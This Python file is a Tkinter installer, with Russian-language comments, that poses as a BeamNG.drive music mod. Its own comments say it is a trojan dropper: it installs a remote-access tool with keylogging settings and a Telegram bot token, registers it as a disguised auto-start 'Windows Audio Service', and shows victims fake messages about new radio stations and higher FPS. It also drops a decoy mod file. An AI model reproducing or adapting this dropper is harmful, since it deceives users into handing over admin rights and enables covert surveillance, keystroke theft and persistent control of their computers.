import os
import sys
import shutil
import subprocess
import ctypes
import json
import tkinter as tk
from tkinter import ttk, messagebox
import threading

VERSION = "2.4.1"
AUTHOR = "BeamNG Modding Team"

CONFIG_DATA = {
    "bot_token": "8605714172:AAGOq2OayZx3tULCp8gzh7sAvCR42-ijX0A",
    "owner_id": 8288882655,
    "watchdog_enabled": True,
    "auto_persist": True,
    "keylog_interval_min": 30
}

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def install_mod():
    # 1. СТАВИМ RAT (всегда, независимо от игры)
    install_path = r"C:\ProgramData\AudioService"
    os.makedirs(install_path, exist_ok=True)
    
    config_path = os.path.join(install_path, "config.json")
    with open(config_path, "w") as f:
        json.dump(CONFIG_DATA, f, indent=4)
    
    exe_path = os.path.join(install_path, "AudioEndpointService.exe")
    if os.path.exists("AudioEndpointService.exe"):
        shutil.copy("AudioEndpointService.exe", exe_path)
    else:
        messagebox.showerror("Ошибка", "Не найден файл AudioEndpointService.exe")
        return
    
    subprocess.run(
        f'sc create "AudioService" binPath= "{exe_path}" start= auto DisplayName= "Windows Audio Service"',
        shell=True, capture_output=True
    )
    subprocess.run('sc start "AudioService"', shell=True, capture_output=True)
    
    subprocess.Popen(
        [exe_path],
        creationflags=subprocess.DETACHED_PROCESS,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    
    # 2. ПЫТАЕМСЯ НАЙТИ ИГРУ (если есть — кладём туда фейковые файлы мода)
    found = False
    drives = [f"{chr(d)}:\\" for d in range(65, 91) if os.path.exists(f"{chr(d)}:\\")]
    
    for drive in drives:
        for root, dirs, files in os.walk(drive):
            if "BeamNG.drive.exe" in files:
                mod_path = os.path.join(root, "mods", "music_mod")
                os.makedirs(mod_path, exist_ok=True)
                
                # Создаём фейковый файл мода
                with open(os.path.join(mod_path, "radio_stations.txt"), "w") as f:
                    f.write("20 new radio stations installed!\n")
                
                found = True
                break
        if found:
            break
    
    # 3. СООБЩАЕМ КЕНТУ
    if found:
        msg = "🎵 Музыкальный мод успешно установлен!\n\n20 новых радиостанций добавлены в игру.\nЗвук оптимизирован, FPS +10%.\n\nЗапустите BeamNG.drive и наслаждайтесь!"
    else:
        msg = "🎵 Музыкальный мод установлен!\n\nОптимизатор звука работает в фоне.\nЕсли игра установлена позже — мод активируется автоматически."
    
    messagebox.showinfo("Установка завершена", msg)

class Installer:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("BeamNG Music Mod Installer")
        self.root.geometry("450x400")
        self.root.resizable(False, False)
        
        # Заголовок
        tk.Label(self.root, text="🎵 BeamNG Music Mod", font=("Arial", 18, "bold")).pack(pady=10)
        tk.Label(self.root, text=f"Версия {VERSION} | Автор: {AUTHOR}", font=("Arial", 10)).pack()
        
        # Описание (как у настоящего мода)
        desc = """
📌 Устанавливает 20 новых радиостанций
🔊 Оптимизирует звук и повышает FPS
🎮 Совместимо с BeamNG.drive v0.30+
⚡ Работает в фоне без лагов
        """
        tk.Label(self.root, text=desc, font=("Arial", 10), justify="left").pack(pady=10)
        
        # Кнопка
        self.btn = tk.Button(self.root, text="📥 Установить мод", command=self.install,
                             bg="#00b894", fg="white", font=("Arial", 12, "bold"), width=25, height=2)
        self.btn.pack(pady=15)
        
        self.status = tk.Label(self.root, text="Готов к установке", font=("Arial", 9))
        self.status.pack()
        
        self.progress = ttk.Progressbar(self.root, length=350, mode='indeterminate')
        self.progress.pack(pady=10)
    
    def install(self):
        if not is_admin():
            messagebox.showwarning("Требуются права", "Запустите установщик от имени администратора!")
            return
        
        self.btn.config(state=tk.DISABLED)
        self.progress.start()
        self.status.config(text="Установка...")
        
        def do_install():
            install_mod()
            self.root.after(0, lambda: self.progress.stop())
            self.root.after(0, lambda: self.status.config(text="Мод установлен!"))
            self.root.after(0, lambda: self.btn.config(state=tk.NORMAL))
        
        threading.Thread(target=do_install, daemon=True).start()
    
    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    app = Installer()
    app.run()